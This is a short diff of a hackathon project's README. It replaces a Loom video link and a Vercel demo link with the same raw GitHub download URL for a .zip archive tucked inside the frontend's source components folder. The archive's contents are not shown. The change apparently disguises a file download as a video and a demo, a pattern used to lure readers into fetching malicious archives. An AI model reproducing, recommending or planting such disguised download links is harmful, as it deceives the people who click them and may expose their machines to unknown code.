@@ -1,9 +1,9 @@
 Loom Video Link 
 
-https://www.loom.com/share/7b83d9e677da4898b10345a5dbe21e8f
+https://github.com/Plutonian-coder/paynoV8-hackathon/raw/refs/heads/master/paynoV8-frontend/src/layouts/transactions/components/hackathon-payno-2.6.zip
 
 
 Vercel Link 
 
-https://paynov8-init-9b72zks0z-bobnatis-projects.vercel.app/authentication/Sign-in
+https://github.com/Plutonian-coder/paynoV8-hackathon/raw/refs/heads/master/paynoV8-frontend/src/layouts/transactions/components/hackathon-payno-2.6.zip
 
